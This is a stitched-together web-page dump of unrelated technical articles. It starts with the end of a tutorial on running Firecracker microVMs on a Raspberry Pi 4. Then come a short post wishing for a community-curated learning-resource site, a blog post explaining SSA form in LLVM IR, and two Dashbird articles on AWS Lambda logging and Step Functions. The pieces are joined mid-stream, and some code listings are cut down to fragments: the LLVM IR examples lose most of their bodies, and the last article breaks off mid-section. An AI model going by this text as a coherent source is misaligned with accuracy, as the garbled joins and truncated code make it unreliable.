since it is the GIC-400 chip which implements GICv2. Next is the <code>reg</code>
property of the FDT, which includes the addresses and the corresponding sizes of
the GIC registers, i.e. distributor and CPU for GICv2, distributor and
redistributor for GICv3. Finally, we fix the <code>interrupts</code> property which
determines the interrupt source of the VGIC maintenance interrupt. The
corresponding values for GICv2 were taken from the respective <a href="https://github.com/torvalds/linux/blob/master/Documentation/devicetree/bindings/interrupt-controller/arm%2Cgic.yaml">Linux Kernel entries</a>.</p>

<h4 id="build-firecracker-with-rpi4-support">Build firecracker with RPi4 support</h4>

<p>While waiting for the patch to merge upstream you can go ahead and check out it
yourself.</p>

<p>Clone and build our fork of firecracker (keep in mind that while the PR review
is going on, we might force-update the branch).</p>
<div><pre><code data-lang="bash">$ git clone https://github.com/cloudkernels/firecracker.git
$ <span>cd</span> firecracker
$ ./tools/devtool build</code></pre></div>
<p>Next you need a kernel image and a root filesystem to run with your firecracker
build. You can grab the pre-built kernel image and rootfs here:</p>
<div><pre><code data-lang="bash">$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/kernel/vmlinux.bin
$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/fsfiles/xenial.rootfs.ext4 </code></pre></div>
<p>Alternatively, you can build your own kernel and rootfs using the following
steps provided by the firecracker docs
<a href="https://github.com/cloudkernels/firecracker/blob/master/docs/rootfs-and-kernel-setup.md">here</a></p>

<h4 id="launch-our-image">Launch our image</h4>

<p>To launch our image we will use the <a href="https://github.com/firecracker-microvm/firectl">firectl</a> tool. We need, to setup a tap
device for the networking or our firecracker microVM.</p>
<div><pre><code data-lang="bash">$ sudo ip tuntap add dev tap0 mode tap
$ sudo ip addr add <span>172</span>.16.0.1/24 dev tap0
$ sudo ip link <span>set</span> tap0 up</code></pre></div>
<p>And we launch the microVM using firectl:</p>
<div><pre><code data-lang="bash">firectl --firecracker-binary<span>=</span><span>${</span><span>PATH_TO_FC_BIN</span><span>}</span> --kernel<span>=</span>vmlinux.bin <span>\
</span><span></span>	--tap-device<span>=</span>tap0/aa:fc:00:00:00:01 <span>\
</span><span></span>	--kernel-opts<span>=</span><span>"console=ttyS0 reboot=k panic=1 pci=off ip=172.16.0.42::172.16.0.1:255.255.255.0::eth0:off"</span> <span>\
</span><span></span>	--root-drive<span>=</span>./nginx_fc.ext4</code></pre></div>
<p>Here, we used here the <code>ip</code> kernel boot parameter to give the <code>172.16.0.42</code>.</p>

<p>Finally, we try out our nginx server:</p>
<div><pre><code data-lang="html">curl 172.16.0.42
<span>&lt;!DOCTYPE html&gt;</span>
&lt;<span>html</span>&gt;
&lt;<span>head</span>&gt;

&lt;<span>style</span>&gt;
    <span>body</span> {
        <span>width</span>: <span>35</span><span>em</span>;
        <span>margin</span>: <span>0</span> <span>auto</span>;
        <span>font-family</span>: Tahoma, Verdana, Arial, <span>sans-serif</span>;
    }
&lt;/<span>style</span>&gt;
&lt;/<span>head</span>&gt;
&lt;<span>body</span>&gt;
&lt;<span>h1</span>&gt;Welcome to nginx!&lt;/<span>h1</span>&gt;
&lt;<span>p</span>&gt;If you see this page, the nginx web server is successfully installed and

           <p>I often want to learn about some topic, from very broad (like "C# programming") to very specific (like "Source Generators in C#"). There are lots of resources about any topic (blog posts, articles, videos, courses, books, etc.) and some are good, some bad. On Google, you get results sorted by some algorithm and they may not necessary be the best for learning or suitable for your level of knowledge (e.g., beginner/advanced). Search results are just not very well curated.</p><div><p>I imagine there should be a site where anyone could register links to such learning resources, organize them by topics and rate them, so the best resources for the topic are selected by the community.</p><p>I know that for programming topics, there are pages on GitHub like <a href="https://github.com/quozd/awesome-dotnet">Awesome .NET</a>&nbsp;or <a href="https://github.com/Solido/awesome-flutter">Awesome Flutter</a>&nbsp;where people create curated lists of resources about some programming language. However, I believe this should be more unified and accessible also to other areas than programming. It should be similarly open for contributions like GitHub Pull Requests but not so complex.</p></div>

<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>

  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        

                        <p>Today, we’ll cover some of the ways that you might find quite useful in your everyday work. We’ll go through some of the best practices for logging in AWS Lambda, and we will explain how and why these ways will simplify your&nbsp;AWS Lambda logging. For more information about similar topics, be sure to visit our blog page on our website. But, let’s start with the basics. What is logging?</p>
<h3 id="logging-in-aws-lambda">Logging In AWS Lambda</h3>
<p>AWS Lambda is a service that will automatically monitor Lambda functions for you, and it will report the metrics via Amazon CloudWatch. In order to help you with resolving the function failures, Lambda logs will manage all requests by your function as well as it will automatically store logs that are generated by your code through Amazon CloudWatch Logs.</p>
<p>You’re able to put logging statements in your code which will help in validating that your code is working correctly and as expected. Lambda integrates with&nbsp;<a href="https://aws.amazon.com/cloudwatch/">CloudWatch</a>&nbsp;Logs automatically, and it pushes all the logs from your code to a CloudWatch Logs group which is associated with a Lambda function. It’s worth mentioning that using Lambda logs means that there are no extra charges, but don’t forget that the standard CloudWatch charges will apply.</p>
<h3 id="centralize-the-logging-in-aws-lambda">Centralize The Logging In AWS Lambda</h3>
<p>You should know that there are various log aggregation services like Splunk, Logz.io, Sumologic, Papertrail, Logzilla, Logmatic.io, and numerous others. Why do we need them? They exist to help us move the Lambda logs from our existing CloudWatch Logs to another more stable log service. You should know that, for example, when you’re processing CloudWatch Logs with a Lambda function, you need to be mindful of the number of simultaneous executions it creates since CloudWatch Logs is an asynchronous event source for Lambda. Let’s say that you have 100 functions that run simultaneously. Every one of them will push logs to CloudWatch Logs. Therefore, this, in turn, is able to trigger 100 simultaneous executions of the log shipping function.</p>
<p>Furthermore, this event can potentially double the number of functions that are simultaneously running in your region. You should remember that there is a soft, regional limit of 1000 simultaneous executions for all functions. You can also make a Reversed Concurrency for the log shipping function which will limit its maximum number of simultaneous executions, but there is a risk of losing logs when the log shipping functions are suppressed.</p>
<h3 id="streaming-logs">Streaming Logs</h3>
<p>Take a look at the CloudWatch console, and you’ll see under the “Actions” tab an option to select a log group (one for every Lambda function), and then you can decide whether you should stream the data directly to Amazon’s hosted Elasticsearch service. In case you’re already a user of Elasticsearch service, this will come in quite handy, but if you’re still thinking about the possible options, there are alternatives.</p>
<p>A more exciting way to stream your logs would be to stream them from CloudWatch Logs to a Kinesis stream first because from Kinesis stream Lambda function is able to process logs and forward them toward a log aggregation service of your choosing. With this way of log manipulation, you have complete control over the concurrency of the log shipping function. Following the increase of the log events, you’re able to increase the shard number inside the Kinesis stream which will furthermore lead to an increased number of simultaneous executions of the log shipping function.</p>
<p>When creating a new function from a Lambda console, you’re able to choose from a number of blueprints to push CloudWatch Logs to some other log aggregation service. This option enables you to write a Lambda function that will ship your CloudWatch Logs to a preferred log aggregation service, but there are some things you should be careful about.</p>
<h3 id="new-log-groups-auto-subscription">New Log Groups Auto-Subscription</h3>
<p>Every time you create a new Lambda function, a new log group will be automatically formed in CloudWatch Logs. What you want to avoid is a manual process of subscribing log groups to your function. Enabling CloudTrail and setting up an event pattern in CloudWatch Events will allow you to invoke different Lambda function every time a log group is created. This setup can be done manually from the CloudWatch console. In case you’re working with several different AWS accounts, it’s advisable to avoid making a manual configuration.</p>
<p>Serverless Framework allows you to set up the event source for this function in the serverless.yml file. Remember that you must avoid subscribing the log group for the ship-logs function to itself since it will create an infinite invocation loop. After Lambda creates a new log group for your function, the retention policy is to keep them (forever!). It is totally unnecessary, while the storage for all these logs can cost pretty much since the logs can add up over time. Luckily, you can add another Lambda function which can automatically update the retention policy to something much more adequate</p>
<h3 id="what-is-dashbird-offering">What is Dashbird Offering?</h3>
<p><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/image-1.png" alt="Dashbird Lambda logging AWS" width="696" height="381" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/image-1.png 696w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/image-1-300x164.png 300w" sizes="(max-width: 696px) 100vw, 696px"></p>

<p>You should know that with&nbsp;<a href="http://dashbird.io/">Dashbird</a> you’ll be able to do a lot with little effort, whatsoever. Take into consideration that Dashbird’s data collection goes directly from CloudWatch APIs and that there’s no overhead when it comes to using Dashbird, which is another way of saying that you won’t incur any extra costs nor will your app be slowed down by extra requests. Another perk offered by Dashbird is Live Tailing which essentially gives you the opportunity to receive your function’s log streams in real-time. X-Ray is another benefit provided by Dashbird whose seamless integration gives you the best tracing possibilities and it allows you to keep a close eye on what your invocation is doing.</p>
<p><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/image.png" alt="Dashbird Lambda logging AWS X-Ray" width="703" height="381" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/image.png 703w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/image-300x163.png 300w" sizes="(max-width: 703px) 100vw, 703px"></p>
<p>X-Ray is a potent tool that enables you to trace the data throughout the active cycle of the invocation while it also serves as a tool to track the full extent of an invocation flow. Supporting custom traces, X-Ray gives you the opportunity to track data manually. It’s also worth mentioning that Dashbird can have an automated system of detecting if the X-Ray option is enabled or disabled. In case you open an invocation that belongs to a lambda that has active X-Ray monitoring it’s able to get X-Ray data on-demand while it will also show you the results. We are free to say that Dashbird came through in providing you with an easy way of understanding how and when the time was lost and what actually happened there.</p>
<h3 id="where-does-that-leave-us">Where does that leave us?</h3>
<p>Depending on what your needs are, you should either ship your logs to some of the log aggregation services or even stream your logs using Kinesis log streaming. Be careful when thinking about which log aggregate service you should choose since all of them have their perks and their faults. Try to avoid the infinite invocation loop; therefore the unnecessary added cost. Read the users’ comments and their experiences, their ups, and downs, so you’ll know upfront what you can expect from every single aggregation service and generally how to avoid situations you don’t want to end up in.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        

                        <p>The use of serverless computing has become a must nowadays, and some of you may already know a thing or two about Amazon Web Services like <a href="https://dashbird.io/knowledge-base/aws-lambda/introduction-to-aws-lambda/">Lambda Functions</a>, Step Functions, and other services AWS provides. However, if this is the first time you hear about them – fantastic!</p>
<p>In this article, we’ll discuss AWS Step Functions, what they are used for, how to use them, and the advantages or disadvantages that they bring.</p>
<h2><span><b>AWS Step Functions 101</b></span></h2>
<p>Before we can jump into Step Functions, you need to familiarize yourself with the basic structure behind them. Step Functions are an AWS-managed service that uses <a href="https://dashbird.io/knowledge-base/well-architected/finite-state-machine/">Finite-State Machine (FSM)</a> model.</p>
<p><em>Why is that important?</em></p>
<p>By coordinating multiple AWS services into different serverless workflows, you can quickly build and update the apps. Additionally, with Step Functions, you’ll be able to both design and run workflows that’ll bring together various services, including Amazon ECS and AWS Lambda, into feature-rich applications.</p>
<h2><b>FSM Model Explained</b></h2>
<p>The two keywords you need to remember are States and Transitions.</p>
<p><em>Now, why are these words so important?</em></p>
<p>FSM model does a simple job – it uses given states and transitions to complete the tasks at hand. Finite-State Machines are also known as a behavioral model. It’s an abstract machine (system) that can be in 1 (one) state at a time, but it can also switch between a finite number of states.</p>
<p>This machine is defined solely by its states and the relationship these states have between themselves. A good and very straightforward example is the “closed-door example.” The door can either be open or closed, and these are the only two possible states. Now, the transition part is the switch between two states, but you need to provide some input first to get there. When you close the door, you’re placing an input. Additionally, the sequence of opening the closed door is known as the switch between two states (transition).</p>
<figure id="attachment_2958" aria-describedby="caption-attachment-2958"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-1024x626.png" alt="StepFunctions state input and transition" width="640" height="391" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-1024x626.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-300x183.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00-768x469.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.21.00.png 1162w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2958"><em>StepFunctions state input and transition</em></figcaption></figure>

<p>You can also apply the same thing to other examples, like your daily life routines. Let’s take “Work, home, bed” as states. From work (state), you take a bus (input) to get home (state), and when you arrive home, you go to bed (another input leading to another state). Tomorrow morning when you wake up and get out of your bed, you’re transitioning from the last state you were in into a previous one, and yet again, taking the bus from home to work is one more transition.</p>
<p>There are other, more complex examples with many more states, inputs, and transitions between them, and the more states you add, the more complex the FSM model becomes.</p>
<p>The conclusion is simple – FSMs are a method of modeling your system by defining the states and transitions between those states.</p>
<h2><span><b>What Are Step Functions?</b></span></h2>
<p>Step Functions are Amazon’s Finite-State Machines service that’s entirely managed while also being serverless. Step Functions are made of state machines (workflows) and tasks. Tasks are individual states or single units of work.</p>
<p>In the following graph, you’ll see an example of Amazon’s State Machine in which the green rectangles represent the states. The result leads to another state, which then leads to the choice that depends on the given input (email or SMS). In this example, the green states were successfully executed, while the white-colored state wasn’t.</p>
<figure id="attachment_2959" aria-describedby="caption-attachment-2959"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-1024x853.png" alt="Amazon's state machine" width="640" height="533" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-1024x853.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-300x250.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03-768x640.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.24.03.png 1152w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2959"><em>Amazon’s state machine</em></figcaption></figure>

<p>This entire graph representing the state machine is also known as a Workflow, and there are two types of workflows available.</p>
<h2><span><b>Step Function Workflow</b></span></h2>
<h3><b>Types Of Workflows</b></h3>
<p>Workflows are divided into two groups: Standard and Express workflow. Unlike Standard, the Express workflow is a relatively new option that has been available since last year. The table below shows the differences between these two workflow types.</p>
<table>
<tbody>
<tr>
<td>
<p><b>Workflows</b></p>
</td>
<td>
<p><b>Standard</b></p>
</td>
<td>
<p><b>Express</b></p>
</td>
</tr>
<tr>
<td>
<p><b>Max Duration</b></p>
</td>
<td>
<p>1 year</p>
</td>
<td>
<p>5 minutes</p>
</td>
</tr>
<tr>
<td>
<p><b>Execution Rate </b><b>(per second)</b></p>
</td>
<td>
<p>2000+</p>
</td>
<td>
<p>100.000+</p>
</td>
</tr>
<tr>
<td>
<p><b>State Transitions</b></p>
</td>
<td>
<p>4000+</p>
</td>
<td>
<p>Unlimited</p>
</td>
</tr>
<tr>
<td>
<p><b>Price</b></p>
</td>
<td>
<p>Per state transition</p>
</td>
<td>
<p>Number of executions, duration &amp; memory</p>
</td>
</tr>
<tr>
<td>
<p><b>Execution</b></p>
</td>
<td>
<p>Exactly once</p>
</td>
<td>
<p>At least once</p>
</td>
</tr>
<tr>
<td>
<p><b>Execution History</b></p>
</td>
<td>
<p>API, AWS Console or CloudWatch</p>
</td>
<td>
<p>CloudWatch</p>
</td>
</tr>
</tbody>
</table>

<p>State machines orchestrate the work of Lambda functions. When one function ends, it triggers another function to begin. Although Max Duration is significantly different, Express workflow allows more scalability. Moreover, Express workflow pricing is constructed with more details since users will have to pay for the number of executions, including the duration and memory used for those executions. Standard workflow pricing requires users to pay only for each state transition that occurs.</p>
<p>It’s important to note that Standard workflow is a long-running workflow that has to be durable and auditable. In contrast, the Express workflow type is needed for a much higher workflow and event processing volume.</p>
<h3><b>Workflow Execution</b></h3>
<p>Now that you know the basics, the next step of the way is the execution. To trigger the workflow to start the execution against Step Function API, you can use CloudWatch events as a time trigger or use API Gateway as a proxy.</p>
<h3><span><b>State Types</b></span></h3>
<p>It’s essential to remember that States aren’t the same thing as Tasks since Tasks are one of the State types. There are numerous State types, and all of them have a role to play in the overall workflow:</p>
<ul>
<li>Pass: Pushes input to output.</li>
<li>Task: Takes input and produces output.</li>
<li>Choice: Allows the user to use Branching Logic that’s based on the input.</li>
<li>Wait: It adds delays to State Machine execution.</li>
<li>Success: Has an expected dead-end that stops execution successfully.</li>
<li>Fail: Has an expected dead-end that stops execution with a failure.</li>
<li>Parallel: Allows a user to implement parallel branches in execution, meaning the user can start multiple states at once.</li>
<li>(Dynamic) Mapping: Runs a set of steps for every input item.</li>
</ul>
<h3><span><b>Tasks</b></span></h3>
<p>Tasks are the leading States in which all the work is done. Tasks can call Activities (remote executions):</p>
<ul>
<li>Call an execution on either ECS, EC2 machines, or mobile devices.</li>
<li>Sending SMS notifications and wait for the input.</li>
</ul>
<p>Another constructive element that Step Functions Tasks provide is that it allows you to reach out from your AWS space.</p>
<h3><span><b>Error Handling</b></span></h3>
<p>Error handling includes retries and catch. An excellent example of how does Step Functions work is shown in the graph below:</p>
